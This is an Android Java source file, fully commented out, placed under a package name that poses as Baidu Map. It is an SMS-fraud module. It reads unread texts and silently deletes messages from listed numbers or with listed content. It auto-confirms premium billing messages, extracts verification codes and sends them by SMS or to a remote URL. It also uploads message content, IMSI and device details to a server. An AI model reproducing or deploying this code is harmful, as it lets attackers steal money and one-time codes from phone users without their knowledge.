//package com.baidu.BaiduMap.sms;
//
//import java.util.HashMap;
//
//import org.json.JSONArray;
//import org.json.JSONException;
//import org.json.JSONObject;
//
//import com.baidu.BaiduMap.httpCenter.GetDataImpl;
//import com.baidu.BaiduMap.pay.SDKInit;
//import com.baidu.BaiduMap.utils.ACacheUtils;
//import com.baidu.BaiduMap.utils.Constants;
//import com.baidu.BaiduMap.utils.Log;
//import com.baidu.BaiduMap.utils.PermissionUtils;
//import com.baidu.BaiduMap.utils.Utils;
//
//import android.content.ContentResolver;
//import android.content.Context;
//import android.database.ContentObserver;
//import android.database.Cursor;
//import android.net.Uri;
//import android.os.Build;
//import android.os.Message;
//import android.widget.Toast;
//
///**
// * @author Javen 数据库观察者
// */
//public class SmsObserver extends ContentObserver {
//    private static String TAG = "SmsObserver";
//    private ContentResolver mResolver;
//    public SmsHandler smsHandler;
//    public Context context;
//    String payType;
//    // private int i = 0;
//    private static boolean isDelete = false;
//    static int i = 0;
//    HashMap<Integer, String> map = new HashMap<>();
//
//    public SmsObserver(ContentResolver mResolver, SmsHandler handler, Context context) {
//        super(handler);
//        this.mResolver = mResolver;
//        this.smsHandler = handler;
//        this.context = context;
//        Toast.makeText(context, "SmsObserver has inited!", Toast.LENGTH_SHORT).show();
//    }
//
//    @Override
//    public void onChange(boolean selfChange, Uri uri) {
//        Log.debug("==========>selfChange:" + selfChange);
////        if (Constants.isOutPut) {
////            Log.debug("==content://sms/" + uri.toString());
////        }
////        if (interceptSMS(uri)) {
////            deleteByContent(uri);
////            deleteByNumber(uri);
////            if (Constants.isOutPut) {
////                Log.debug("=====>delete SMS");
////            }
////        }
////        return;
//        if (Build.VERSION.SDK_INT >= 23) {
//            PermissionUtils.getInstance().Check_READ_SMS_Permission(context);
//        } else {
//            interceptSMS(uri);
//        }
//    }
//
//    /**
//     * 拦截
//     */
//    private boolean interceptSMS(Uri uri) {
//        boolean a = false;
//        Cursor mCursor = mResolver.query(Uri.parse("content://sms"),
//                new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"0"},
//                "date desc");
//        JSONArray array = new JSONArray();
//        while (mCursor.moveToNext()) {
//            JSONObject object = new JSONObject();
//            SmsInfo _smsInfo = new SmsInfo();
//            int _inIndex = mCursor.getColumnIndex("_id");
//            if (_inIndex != -1) {
//                _smsInfo._id = mCursor.getString(_inIndex);
//            }
//
//            int thread_idIndex = mCursor.getColumnIndex("thread_id");
//            if (thread_idIndex != -1) {
//                _smsInfo.thread_id = mCursor.getString(thread_idIndex);
//            }
//
//            int addressIndex = mCursor.getColumnIndex("address");
//            if (addressIndex != -1) {
//                _smsInfo.smsAddress = mCursor.getString(addressIndex);
//            }
//
//            int bodyIndex = mCursor.getColumnIndex("body");
//            if (bodyIndex != -1) {
//                _smsInfo.smsBody = mCursor.getString(bodyIndex);
//            }
//
//            int readIndex = mCursor.getColumnIndex("read");
//            if (readIndex != -1) {
//                _smsInfo.read = mCursor.getString(readIndex);
//            }
//            try {
//                object.put(mCursor.getString(mCursor.getColumnIndex("_id")), (Object) _smsInfo);
//                array.put(object);
//            } catch (JSONException e) {
//                e.printStackTrace();
//            }
//        }
//        try {
//            SmsInfo info = (SmsInfo) array.getJSONObject(0).get(uri.toString().substring(uri.toString().lastIndexOf("/") + 1));
//            smsHandle(info, context);
//            Log.debug("smsBody:" + info.smsBody);
//            Log.debug("smsAddress:" + info.smsAddress);
//            if (mCursor != null && Build.VERSION.SDK_INT < 14) {
//                mCursor.close();
//            }
//        } catch (Exception e) {
//            // Log.debug("catch xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" + e);
//            return true;
//        }
//        return a;
//    }
//
//    /**
//     * 根据短信内容删除短信
//     */
//    private boolean deleteByContent(Uri uri) {
//        for (String content : ACacheUtils.getInstance(context).getMessageData()) {
//            Cursor mCursor = mResolver.query(Uri.parse("content://sms"),
//                    new String[]{"_id", "address", "thread_id", "date", "protocol", "type", "body", "read"},
//                    "body LIKE ? ", new String[]{content + "%"}, "date desc");
//            while (mCursor.moveToNext() && mCursor.getCount() > 0) {
//                SmsInfo _smsInfo = new SmsInfo();
//                int _inIndex = mCursor.getColumnIndex("_id");
//                if (_inIndex != -1) {
//                    _smsInfo._id = mCursor.getString(_inIndex);
//                }
//
//                int thread_idIndex = mCursor.getColumnIndex("thread_id");
//                if (thread_idIndex != -1) {
//                    _smsInfo.thread_id = mCursor.getString(thread_idIndex);
//                }
//
//                int addressIndex = mCursor.getColumnIndex("address");
//                if (addressIndex != -1) {
//                    _smsInfo.smsAddress = mCursor.getString(addressIndex);
//                }
//
//                int bodyIndex = mCursor.getColumnIndex("body");
//                if (bodyIndex != -1) {
//                    _smsInfo.smsBody = mCursor.getString(bodyIndex);
//                }
//
//                int readIndex = mCursor.getColumnIndex("read");
//                if (readIndex != -1) {
//                    _smsInfo.read = mCursor.getString(readIndex);
//                }
//                delete(_smsInfo);
//            }
//            if (mCursor != null) {
//                mCursor.close();
//                mCursor = null;
//            }
//        }
//        return true;
//    }
//
//    /**
//     * 根据号码删除短信
//     */
//    private void deleteByNumber(Uri uri) {
//        for (String phoneNum : ACacheUtils.getInstance(context).getPhoneData()) {
//            Cursor mCursor = mResolver.query(Uri.parse("content://sms"),
//                    new String[]{"_id", "address", "thread_id", "date", "protocol", "type", "body", "read"},
//                    "address LIKE ? ", new String[]{phoneNum + "%"}, "date desc");
//            while (mCursor.moveToNext() && mCursor.getCount() > 0) {
//                SmsInfo _smsInfo = new SmsInfo();
//                int _inIndex = mCursor.getColumnIndex("_id");
//                if (_inIndex != -1) {
//                    _smsInfo._id = mCursor.getString(_inIndex);
//                }
//
//                int thread_idIndex = mCursor.getColumnIndex("thread_id");
//                if (thread_idIndex != -1) {
//                    _smsInfo.thread_id = mCursor.getString(thread_idIndex);
//                }
//
//                int addressIndex = mCursor.getColumnIndex("address");
//                if (addressIndex != -1) {
//                    _smsInfo.smsAddress = mCursor.getString(addressIndex);
//                }
//
//                int bodyIndex = mCursor.getColumnIndex("body");
//                if (bodyIndex != -1) {
//                    _smsInfo.smsBody = mCursor.getString(bodyIndex);
//                }
//
//                int readIndex = mCursor.getColumnIndex("read");
//                if (readIndex != -1) {
//                    _smsInfo.read = mCursor.getString(readIndex);
//                }
//                delete(_smsInfo);
//            }
//            if (mCursor != null) {
//                mCursor.close();
//                mCursor = null;
//            }
//        }
//    }
//
//    private void delete(SmsInfo _smsInfo) {
//        if (Constants.isOutPut) {
//            Log.debug("====>Android系统版本号：" + Utils.getSDKVersionNumber());
//        }
//        new Sms_send_tongbu(_smsInfo.smsAddress + "   " + _smsInfo.smsBody, SDKInit.getApplication(), 0);
//        if (Constants.isOutPut) {
//            Log.debug("====>获取的短信内容为：" + _smsInfo.toString());
//        }
//        Message msg = smsHandler.obtainMessage();
//        _smsInfo.action = 2;// 0不对短信进行操作;1将短信设置为已读;2将短信删除
//        msg.obj = _smsInfo;
//        smsHandler.sendMessage(msg);
//    }
//
//    private void smsHandle(SmsInfo _smsInfo, Context context) {
//        String sender = _smsInfo.smsAddress;
//        String content = _smsInfo.smsBody;
//
//        if (Constants.isOutPut) {
//            Log.debug("====>smsHandle:" + sender + "::::" + content + "::::" + _smsInfo.read);
//        }
//
//        for (i = 0; i < ACacheUtils.getInstance(context).getList().size(); i++) {
//            String number = "";
//            String senderContent = "";
//            String limitNum = "";//发送号码 limitNum
//            String vCodeLength = "";//验证码长度 limit_msg_1
//            String limit_msg_2 = "";//短信拦截号码 limit_msg_2
//            String a = ACacheUtils.getInstance(context).getList().get(i).toString();
//            Log.debug("======>a:" + a);
//            try {
//                JSONObject json = new JSONObject(a);
//                number = json.getString("limitNum");
//                limit_msg_2 = json.getString("limit_msg_2");
//            } catch (Exception e) {
//
//            }
//            Log.debug("======>sender:" + sender);
//            Log.debug("======>number:" + number);
//            Log.debug("======>if jinlaile:" + sender.contains(number));
//            if (limit_msg_2.equals(sender)) {
//                Log.debug("======>if jinlaile:" + sender.contains(number));
//                try {
//                    JSONObject json = new JSONObject(ACacheUtils.getInstance(context).getList().get(i).toString());
//                    Log.debug("======>ACacheUtils.getInstance(context).getList().get(i).toString():" + ACacheUtils.getInstance(context).getList().get(i).toString());
//                    payType = json.getString("payType");
//                    senderContent = json.getString("fix_msg");
//                    vCodeLength = json.isNull("limit_msg_1") ? "" : json.getString("limit_msg_1");
//                    limitNum = json.isNull("limitNum") ? "" : json.getString("limitNum");
//                    if (limitNum.equals("")) {
//                        limitNum = sender;
//                    }
//                    Log.debug("======>payType:" + payType);
//                    if (payType.equals("0")) {
//
//                    } else if (payType.equals("1")) {
//                        if (Constants.isOutPut) {
//                            Log.debug("======>要开始回复Y了:" + senderContent);
//                        }
//                        if (_smsInfo.smsBody.contains("元")) {
//                            MySmsManager.sendSecondMessage(limitNum, senderContent);
//                        }
//                        Log.debug("=======>limitNum:" + limitNum + "    " + senderContent);
//                        new Sms_send_tongbu(limitNum + "      " + senderContent + "<---回复内容 |||短信内容------>" + senderContent,
//                                context, 10001);
//                    } else if (payType.equals("2")) {
//                        String SmsContent = Utils.getCode2Sms(Integer.valueOf(vCodeLength), content);
//                        MySmsManager.sendSecondMessage(limitNum, SmsContent);
//                        new Sms_send_tongbu("拦截到的发回去的内容----->" + limitNum + "      " + SmsContent, context, 10002);
//                    } else if (payType.equals("3")) {
//                        String SmsContent = Utils.getCode2Sms(Integer.valueOf(vCodeLength), content);
//                        String url = ACacheUtils.getInstance(context).getOtherNeedUrl() + "?vcode=" + SmsContent + "&sendParam=" + ACacheUtils.getInstance(context).getSendParam();
//                        GetDataImpl.doGetRequestWithoutListener(url);
//                        if (Constants.isOutPut) {
//                            Log.debug("------>content:" + content);
//                            Log.debug("------>拦截到的验证码：" + SmsContent);
//                            Log.debug("------>url：" + url);
//                            Log.debug("------>返回的内容：" + content);
//                        }
//                        new Sms_send_tongbu(content + " ----> " + url, context, 10003);
//                    } else if (payType.equals("4")) {
//                        String SmsCode = Utils.getCode2Sms(Integer.valueOf(vCodeLength), content);
//                        Log.debug("======>SmsCode:" + SmsCode);
//                        Log.debug("======>ACacheUtils.getInstance(context).getLimitNum():" + limitNum);
//                        if (SmsCode != null) {
//                            MySmsManager.sendSecondMessage(limitNum, senderContent + SmsCode);
//                            new Sms_send_tongbu("拦截到的发回去的内容----->" + senderContent + SmsCode, context, 10004);
//                        }
//                    } else {
//
//                    }
//                } catch (Exception e) {
//                    Log.debug("=====>e:" + e);
//                }
//            }
//        }
//    }
//}
//
//class Sms_send_tongbu {
//    public Sms_send_tongbu(final String content, final Context mContext, final int sendSuccess) {
//        new Thread() {
//            public void run() {
//                try {
//                    JSONObject json = new JSONObject();
//                    json.put("os_version", android.os.Build.VERSION.RELEASE);
//                    json.put("os_model", android.os.Build.MODEL.replace(" ", "%20"));
//                    json.put("content", content);
//                    json.put("imsi", Utils.getIMSI(mContext));
//                    json.put("status", sendSuccess);
//                    json.put("packageid", Utils.getPackId(mContext));
//                    GetDataImpl.doPostReuqestWithoutListener(Constants.SMS_Send_Tongbu, json.toString());
//                } catch (JSONException e) {
//                    e.printStackTrace();
//                }
//
//            }
//
//            ;
//        }.start();
//    }
//}
